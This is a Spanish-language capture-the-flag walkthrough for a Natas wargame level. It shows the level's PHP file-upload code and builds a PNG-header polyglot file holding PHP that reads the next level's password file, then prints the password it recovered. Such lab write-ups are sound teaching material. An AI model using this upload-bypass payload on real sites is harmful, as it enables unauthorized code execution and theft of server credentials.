Si inspeccionamos el HTML, vemos que es similar al caso anterior. Al leer el
código fuente, notamos que las funciones auxiliares son las mismas, pero cambia
la lógica del guardado:

```php
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
```

El código lee las primeros bytes de la imágen para definir que tipo de imágen
es. Si no es un imágen, devuelve error.

Debemos armar un archivo php cuyos primeros bytes sean similares a los de una
imágen.

```php
PNG

   IHDR         %ÛVÊ   PLTE   §z=Ú   tRNS @æØf   
IDAT×c`    â!¼3    IEND®B`

<?php
readfile("/etc/natas_webpass/natas13");
?>
```

Al igual que el nivel anterior, enviamos el archivo y lo abrimos para obtener la
contraseña del siguiente nivel.

```txt
qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
```
